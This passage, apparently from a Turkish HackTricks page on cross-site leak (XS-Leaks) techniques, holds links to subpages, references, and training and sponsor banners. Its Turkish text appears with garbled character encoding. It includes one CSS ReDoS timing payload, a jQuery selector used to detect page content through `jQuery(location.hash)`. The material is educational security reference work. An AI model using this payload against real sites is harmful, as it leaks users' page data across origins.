{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

EÄŸer `jQuery(location.hash)` kullanÄ±lÄ±yorsa, zamanlama yoluyla **bazÄ± HTML iÃ§eriÄŸinin var olup olmadÄ±ÄŸÄ±nÄ±** bulmak mÃ¼mkÃ¼ndÃ¼r, bu, `main[id='site-main']` seÃ§icisi eÅŸleÅŸmezse geri kalan **seÃ§icileri** kontrol etmesine gerek olmadÄ±ÄŸÄ± iÃ§indir:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defenses

Bu tekniklere karÅŸÄ± nasÄ±l korunacaÄŸÄ±nÄ±z hakkÄ±nda daha fazla bilgi iÃ§in [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ve wiki'nin her bÃ¶lÃ¼mÃ¼nde [https://xsleaks.dev/](https://xsleaks.dev/) Ã¶nerilen Ã¶nlemler bulunmaktadÄ±r.

## References

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturmak ve **otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
